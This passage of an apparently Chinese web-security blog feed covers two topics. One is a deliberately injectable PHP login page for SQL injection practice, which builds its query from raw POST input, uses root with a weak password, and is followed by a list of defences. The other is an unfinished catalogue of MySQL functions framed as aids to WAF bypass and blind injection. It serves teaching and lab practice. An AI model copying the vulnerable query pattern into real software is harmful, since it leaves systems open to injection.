class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;SQL注入测试&lt;/title&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>/&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;./sql_login.php&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">用户名:&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span> /&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">密码：&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span> /&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="comment">// 连接mysql</span></span><br><span class="line"><span class="variable">$conn</span>=mysqli_connect(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;123456&#x27;</span>);</span><br><span class="line">        <span class="comment">//判断连接是否成功</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;连接MySQL发生错误:&#x27;</span>.mysqli_error(<span class="variable">$conn</span>);</span><br><span class="line">&#125;</span><br><span class="line">        <span class="comment">// 选择库</span></span><br><span class="line">mysqli_select_db(<span class="variable">$conn</span>, <span class="string">&#x27;test&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span> (<span class="string">&quot;无法正确连接到数据库！&quot;</span>);</span><br><span class="line"><span class="comment">// 设置utf-8编码</span></span><br><span class="line">mysqli_query(<span class="variable">$conn</span>, <span class="string">&#x27;set names utf-8&#x27;</span>);</span><br><span class="line">        <span class="comment">// 取消报错显示</span></span><br><span class="line">        error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// 接收参数</span></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="comment">// 拼接sql语句并执行</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM user WHERE username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>=mysqli_query(<span class="variable">$conn</span>, <span class="variable">$sql</span>))&#123;</span><br><span class="line">    <span class="variable">$row</span>=mysqli_fetch_array(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$row</span>[<span class="string">&quot;username&quot;</span>] . <span class="string">&quot;，您已登录成功！&quot;</span> . <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;登录失败，用户名或密码错误！&quot;</span> . <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;（请输入正确的用户名和密码进行登录）&quot;</span> . <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;SQL拼接结果：&#x27;</span>.<span class="variable">$sql</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><strong>对应页面如下：</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210307173151304.png" alt="image-20210307173151304"></p><p><strong>构造万能密码登录：</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210307120812568.png"></p><p><strong>以其他方式进行注入：</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210307121042343.png"></p><h1 id="注入漏洞的防御"><a href="#注入漏洞的防御" class="headerlink" title="注入漏洞的防御"></a>注入漏洞的防御</h1><p><strong>代码方向</strong></p><ol><li>对用户输入数据进行转义，例如<code>addslashes()</code> 函数在指定的预定义字符前添加反斜杠，把<code>&#39;</code>转义为<code>\&#39; </code></li><li>对特定的关键词进行匹配过滤。如可以检测<code>select</code>、<code>from</code>、<code>union</code>等关键词，将其过滤。</li><li>对数据类型及数据长度进行严格限定，防止用户输入过多的无用数据。</li><li>采用sql语句预编译，SQL引擎会预先进行语法分析，产生语法树，生成执行计划，也就是说，后面无论输入的是什么，都不会影响该sql语句的 语法结构。</li><li>使用正则表达式过滤传入的参数。</li></ol><p><strong>服务器方向</strong></p><ol><li>对数据库采用最小权限分配，如普通用户与系统管理员用户的权限进行严格的区分，这样即使可以拿到权限也不会造成更大的损失。</li><li>避免显示SQL执行报错的信息，防止报错信息被利用。</li><li>数据层的编码统一，防止过滤模型被绕过。</li></ol><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote><p>[1] <a href="https://www.cnblogs.com/wangyuyang1016/p/12172026.html">常见的sql注入环境搭建</a></p><p>[2] <a href="https://bu1.github.io/2021/01/06/%E7%AC%AC%E5%8D%81%E4%B8%80%E5%91%A8%EF%BC%9A%E6%89%8B%E5%B7%A5%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%89%8D%E7%BC%96%E5%86%99%E7%9A%84%E6%B3%A8%E5%85%A5%E7%8E%AF%E5%A2%83/">第十一周：手工测试之前编写的注入环境</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
          <category> SQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL函数及提权</title>
      <link href="posts/22595.html"/>
      <url>posts/22595.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>在 sql 注入时为了应对各种限制措施，利用数据库自带的一些系统函数经过各种变换之后可以绕过一些 安全设备或者一些基础防御的措施，比如一些字符串转换的函数、截取字符串长度的函数等，</p><p> 应用的场景包括：通过注入获取数据、变换字符串绕过 WAF、盲注猜解字符数据等 </p></blockquote><h1 id="MySQL自带函数的功能与用法"><a href="#MySQL自带函数的功能与用法" class="headerlink" title="MySQL自带函数的功能与用法"></a>MySQL自带函数的功能与用法</h1><h2 id="MySQL-字符串函数"><a href="#MySQL-字符串函数" class="headerlink" title="MySQL 字符串函数"></a>MySQL 字符串函数</h2><p><strong>1.ASCII(s)</strong>   </p><p>返回字符串 s 的第一个字符的 ASCII 码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT ASCII(&#39;MySQL&#39;) AS NumCodeOfFirstChar;</span><br><span class="line">+--------------------+</span><br><span class="line">| NumCodeOfFirstChar |</span><br><span class="line">+--------------------+</span><br><span class="line">|                 77 |</span><br><span class="line">+--------------------+</span><br></pre></td></tr></table></figure><p><strong>2.CHAR_LENGTH(s)</strong></p><p>返回字符串 s 的字符数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT CHAR_LENGTH(&quot;MySQL&quot;) AS LengthOfString;</span><br><span class="line">+----------------+</span><br><span class="line">| LengthOfString |</span><br><span class="line">+----------------+</span><br><span class="line">|              5 |</span><br><span class="line">+----------------+</span><br></pre></td></tr></table></figure><p><strong>3.CONCAT(s1,s2…sn)</strong></p><p>字符串 s1,s2 等多个字符串合并为一个字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT CONCAT (&#39;I&#39;,&#39; &#39;,&#39;am&#39;,&#39; &#39;,&#39;learning&#39;,&#39; &#39;,&#39;MySQL&#39;,&#39;.&#39;) AS ConcatenatedString;</span><br><span class="line">+----------------------+</span><br><span class="line">| ConcatenatedString   |</span><br><span class="line">+----------------------+</span><br><span class="line">| I am learning MySQL. |</span><br><span class="line">+----------------------+</span><br></pre></td></tr></table></figure><p><strong>注意区别  CONCAT_WS(x, s1,s2…sn)</strong></p><p>同 CONCAT(s1,s2,…) 函数，但是每个字符串之间要加上 x，x 可以是分隔符</p><p><strong>与  group_concat( [DISTINCT] 要连接的字段 [Order BY 排序字段 ASC/DESC] [Separator ‘分隔符’] )</strong></p><p>可配合<strong>group_by</strong>使用</p><p><strong>4.FIELD(s,s1,s2…)</strong></p><p>返回第一个字符串 s 在字符串列表(s1,s2…)中的位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT FIELD(&quot;c&quot;, &quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, &quot;e&quot;);</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| FIELD(&quot;c&quot;, &quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, &quot;e&quot;) |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">|                                   3 |</span><br><span class="line">+-------------------------------------+</span><br></pre></td></tr></table></figure><p><strong>5.FIND_IN_SET(s1,s2)</strong></p><p>返回在字符串s2中与s1匹配的字符串的位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT FIND_IN_SET(&#39;c&#39;,&#39;a,b,c,d,e&#39;);</span><br><span class="line">+------------------------------+</span><br><span class="line">| FIND_IN_SET(&#39;c&#39;,&#39;a,b,c,d,e&#39;) |</span><br><span class="line">+------------------------------+</span><br><span class="line">|                            3 |</span><br><span class="line">+------------------------------+</span><br></pre></td></tr></table></figure><p><strong>6.FORMAT(x,n)</strong></p><p>函数可以将数字 x 进行格式化 “#,###.##”, 将 x 保留到小数点后 n 位，最后一位四舍五入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT FORMAT(3.1415926535,4);</span><br><span class="line">+------------------------+</span><br><span class="line">| FORMAT(3.1415926535,4) |</span><br><span class="line">+------------------------+</span><br><span class="line">| 3.1416                 |</span><br><span class="line">+------------------------+</span><br></pre></td></tr></table></figure><p><strong>7.INSERT(s1,x,len,s2)</strong></p><p>字符串 s2 替换 s1 的 x 位置开始长度为 len 的字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT INSERT(&#39;MySQL&#39;,1,2,&#39;Your&#39;);</span><br><span class="line">+----------------------------+</span><br><span class="line">| INSERT(&#39;MySQL&#39;,1,2,&#39;Your&#39;) |</span><br><span class="line">+----------------------------+</span><br><span class="line">| YourSQL                    |</span><br><span class="line">+----------------------------+</span><br></pre></td></tr></table></figure><p><strong>8.LOCATE(s1,s)</strong></p><p>从字符串 s 中获取 s1 的开始位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT LOCATE(&#39;SQL&#39;,&#39;MySQL&#39;);</span><br><span class="line">+-----------------------+</span><br><span class="line">| LOCATE(&#39;SQL&#39;,&#39;MySQL&#39;) |</span><br><span class="line">+-----------------------+</span><br><span class="line">|                     3 |</span><br><span class="line">+-----------------------+</span><br></pre></td></tr></table></figure><p><strong>9.LOWER(s)|LCASE(s)</strong></p><p>将字符串 s 的所有字母变成小写字母</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">SELECT LOWER(&#39;MYSQL&#39;);</span><br><span class="line">+----------------+</span><br><span class="line">| LOWER(&#39;MYSQL&#39;) |</span><br><span class="line">+----------------+</span><br><span class="line">| mysql          |</span><br><span class="line">+----------------+</span><br><span class="line">SELECT LCASE(&#39;MYSQL&#39;);</span><br><span class="line">+----------------+</span><br><span class="line">| LCASE(&#39;MYSQL&#39;) |</span><br><span class="line">+----------------+</span><br><span class="line">| mysql          |</span><br><span class="line">+----------------+</span><br></pre></td></tr></table></figure><p><strong>10.UPPER(s)|UCASE(s)</strong></p><p>将字符串 s 的所有字母变成大写字母</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">SELECT UPPER(&#39;mysql&#39;);</span><br><span class="line">+----------------+</span><br><span class="line">| UPPER(&#39;mysql&#39;) |</span><br><span class="line">+----------------+</span><br><span class="line">| MYSQL          |</span><br><span class="line">+----------------+</span><br><span class="line">SELECT UCASE(&#39;mysql&#39;);</span><br><span class="line">+----------------+</span><br><span class="line">| UCASE(&#39;mysql&#39;) |</span><br><span class="line">+----------------+</span><br><span class="line">| MYSQL          |</span><br><span class="line">+----------------+</span><br></pre></td></tr></table></figure><p><strong>11.LEFT(s,n)</strong></p><p>返回字符串 s 的前 n 个字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT LEFT(&#39;MySQL&#39;,2);</span><br><span class="line">+-----------------+</span><br><span class="line">| LEFT(&#39;MySQL&#39;,2) |</span><br><span class="line">+-----------------+</span><br><span class="line">| My              |</span><br><span class="line">+-----------------+</span><br></pre></td></tr></table></figure><p><strong>12.RIGHT(s,n)</strong></p><p>返回字符串 s 的后 n 个字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT RIGHT(&#39;MySQL&#39;,3);</span><br><span class="line">+------------------+</span><br><span class="line">| RIGHT(&#39;MySQL&#39;,3) |</span><br><span class="line">+------------------+</span><br><span class="line">| SQL              |</span><br><span class="line">+------------------+</span><br></pre></td></tr></table></figure><p><strong>13.LPAD(s1,len,s2)</strong></p><p>在字符串 s1 的开始处填充字符串 s2，使字符串长度达到 len</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT LPAD(&#39;SQL&#39;,7,&#39;My&#39;);</span><br><span class="line">+--------------------+</span><br><span class="line">| LPAD(&#39;SQL&#39;,7,&#39;My&#39;) |</span><br><span class="line">+--------------------+</span><br><span class="line">| MyMySQL            |</span><br><span class="line">+--------------------+</span><br></pre></td></tr></table></figure><p><strong>14.RPAD(s1,len,s2)</strong></p><p>在字符串 s1 的结尾处添加字符串 s2，使字符串的长度达到 len</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT RPAD (&#39;My&#39;,8,&#39;SQL&#39;);</span><br><span class="line">+---------------------+</span><br><span class="line">| RPAD (&#39;My&#39;,8,&#39;SQL&#39;) |</span><br><span class="line">+---------------------+</span><br><span class="line">| MySQLSQL            |</span><br><span class="line">+---------------------+</span><br></pre></td></tr></table></figure><p><strong>15.LTRIM(s)</strong></p><p>去掉字符串 s 开始处的空格</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT LTRIM(&#39;      MySQL&#39;) AS LeftTrimmedString;</span><br><span class="line">+-------------------+</span><br><span class="line">| LeftTrimmedString |</span><br><span class="line">+-------------------+</span><br><span class="line">| MySQL             |</span><br><span class="line">+-------------------+</span><br></pre></td></tr></table></figure><p><strong>16.RTRIM(s)</strong></p><p>去掉字符串 s 结尾处的空格</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT RTRIM (&#39;MySQL      &#39;);</span><br><span class="line">+-----------------------+</span><br><span class="line">| RTRIM (&#39;MySQL      &#39;) |</span><br><span class="line">+-----------------------+</span><br><span class="line">| MySQL                 |</span><br><span class="line">+-----------------------+</span><br></pre></td></tr></table></figure><p><strong>17.TRIM(s)</strong></p><p>去掉字符串 s 开始和结尾处的空格</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT TRIM(&#39;    MySQL    &#39;) AS TrimmedString;</span><br><span class="line">+---------------+</span><br><span class="line">| TrimmedString |</span><br><span class="line">+---------------+</span><br><span class="line">| MySQL         |</span><br><span class="line">+---------------+</span><br></pre></td></tr></table></figure><p><strong>18.MID(s,n,len)|SUBSTR(s, n, len)|SUBSTRING(s, n, len)</strong></p><p>从字符串 s 的 n 位置截取长度为 len 的子字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT MID(&#39;MySQL&#39;,3,3) AS ExtractString;</span><br><span class="line">+---------------+</span><br><span class="line">| ExtractString |</span><br><span class="line">+---------------+</span><br><span class="line">| SQL           |</span><br><span class="line">+---------------+</span><br></pre></td></tr></table></figure><p><strong>19.REPEAT(s,n)</strong></p><p>将字符串 s 重复 n 次</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT REPEAT(&#39;MySQL&#39;,3);</span><br><span class="line">+-------------------+</span><br><span class="line">| REPEAT(&#39;MySQL&#39;,3) |</span><br><span class="line">+-------------------+</span><br><span class="line">| MySQLMySQLMySQL   |</span><br><span class="line">+-------------------+</span><br></pre></td></tr></table></figure><p><strong>20.REPLACE(s,s1,s2)</strong></p><p>将字符串 s2 替代字符串 s 中的字符串 s1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT REPLACE (&#39;MySQL&#39;,&#39;My&#39;,&#39;Your&#39;);</span><br><span class="line">+-------------------------------+</span><br><span class="line">| REPLACE (&#39;MySQL&#39;,&#39;My&#39;,&#39;Your&#39;) |</span><br><span class="line">+-------------------------------+</span><br><span class="line">| YourSQL                       |</span><br><span class="line">+-------------------------------+</span><br></pre></td></tr></table></figure><p><strong>21.REVERSE(s)</strong></p><p>将字符串s的顺序反过来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT REVERSE (&#39;MySQL&#39;);</span><br><span class="line">+-------------------+</span><br><span class="line">| REVERSE (&#39;MySQL&#39;) |</span><br><span class="line">+-------------------+</span><br><span class="line">| LQSyM             |</span><br><span class="line">+-------------------+</span><br></pre></td></tr></table></figure><p><strong>22.SPACE (s)</strong></p><p>返回n个空格</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT SPACE (10);</span><br><span class="line">+------------+</span><br><span class="line">| SPACE (10) |</span><br><span class="line">+------------+</span><br><span class="line">|            |</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure><p><strong>23.STRCMP(s1,s2)</strong></p><p>比较字符串 s1 和 s2，如果 s1 与 s2 相等返回 0 ，如果 s1&gt;s2 返回 1，如果 s1&lt;s2 返回 -1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT STRCMP (&#39;MySQL&#39;,&#39;MySQL&#39;);</span><br><span class="line">+--------------------------+</span><br><span class="line">| STRCMP (&#39;MySQL&#39;,&#39;MySQL&#39;) |</span><br><span class="line">+--------------------------+</span><br><span class="line">|                        0 |</span><br><span class="line">+--------------------------+</span><br></pre></td></tr></table></figure><p><strong>24.SUBSTRING_INDEX(s, delimiter, number)</strong></p><p>返回从字符串 s 的第 number 个出现的分隔符 delimiter 之后的子串。<br>如果 number 是正数，返回第 number 个字符左边的字符串。<br>如果 number 是负数，返回第(number 的绝对值(从右边数))个字符右边的字符串。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">SELECT SUBSTRING_INDEX(&#39;M*y*S*Q*L&#39;,&#39;*&#39;,2);</span><br><span class="line">+------------------------------------+</span><br><span class="line">| SUBSTRING_INDEX(&#39;M*y*S*Q*L&#39;,&#39;*&#39;,2) |</span><br><span class="line">+------------------------------------+</span><br><span class="line">| M*y                                |</span><br><span class="line">+------------------------------------+</span><br><span class="line"> SELECT SUBSTRING_INDEX(&#39;M*y*S*Q*L&#39;,&#39;*&#39;,-3);</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| SUBSTRING_INDEX(&#39;M*y*S*Q*L&#39;,&#39;*&#39;,-3) |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| S*Q*L                               |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">SELECT SUBSTRING_INDEX(SUBSTRING_INDEX(&#39;M*y*S*Q*L&#39;,&#39;*&#39;,-3),&#39;*&#39;,2);</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">| SUBSTRING_INDEX(SUBSTRING_INDEX(&#39;M*y*S*Q*L&#39;,&#39;*&#39;,-3),&#39;*&#39;,2) |</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">| S*Q                                                        |</span><br><span class="line">+------------------------------------------------------------+</span><br></pre></td></tr></table></figure><h2 id="MySQL-数字函数"><a href="#MySQL-数字函数" class="headerlink" title="MySQL 数字函数"></a>MySQL 数字函数</h2><p><strong>1.ABS(x)</strong></p><p> 返回 x 的绝对值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT ABS(-1);</span><br><span class="line">+---------+</span><br><span class="line">| ABS(-1) |</span><br><span class="line">+---------+</span><br><span class="line">|       1 |</span><br><span class="line">+---------+</span><br></pre></td></tr></table></figure><p><strong>2.AVG(expression)</strong></p><p>返回一个表达式的平均值，expression 是一个字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT AVG(Price) AS AveragePrice FROM Products;</span><br><span class="line">+--------------+</span><br><span class="line">| AveragePrice |</span><br><span class="line">+--------------+</span><br><span class="line">|     456.0000 |</span><br><span class="line">+--------------+</span><br></pre></td></tr></table></figure><p><strong>3.三角函数(参数x是弧度)</strong></p><p>SIN(x) | COS(x) | TAN(x) | COT(x) | ASIN(x) | ACOS(x) | ATAN(x) </p><p><strong>4.DEGREES(x)</strong></p><p>将弧度转换为角度　　</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT DEGREES(3.1415926535898) ;</span><br><span class="line">+--------------------------+</span><br><span class="line">| DEGREES(3.1415926535898) |</span><br><span class="line">+--------------------------+</span><br><span class="line">|        180.0000000000004 |</span><br><span class="line">+--------------------------+</span><br></pre></td></tr></table></figure><p><strong>5.CEIL(x)</strong></p><p>返回大于或等于 x 的最小整数　</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT CEIL (0.1);</span><br><span class="line">+------------+</span><br><span class="line">| CEIL (0.1) |</span><br><span class="line">+------------+</span><br><span class="line">|          1 |</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure><p><strong>6.FLOOR(x)</strong></p><p>返回小于或等于 x 的最大整数　　</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> SELECT FLOOR(-0.1);</span><br><span class="line">+-------------+</span><br><span class="line">| FLOOR(-0.1) |</span><br><span class="line">+-------------+</span><br><span class="line">|          -1 |</span><br><span class="line">+-------------+</span><br></pre></td></tr></table></figure><p><strong>7.COUNT(expression)</strong></p><p>返回查询的记录总数，expression 参数是一个字段或者 * 号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT COUNT(User) AS User_number FROM user;</span><br><span class="line">+-------------+</span><br><span class="line">| User_number |</span><br><span class="line">+-------------+</span><br><span class="line">|           6 |</span><br><span class="line">+-------------+</span><br></pre></td></tr></table></figure><p><strong>8.n DIV m</strong></p><p>整除，n 为被除数，m 为除数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 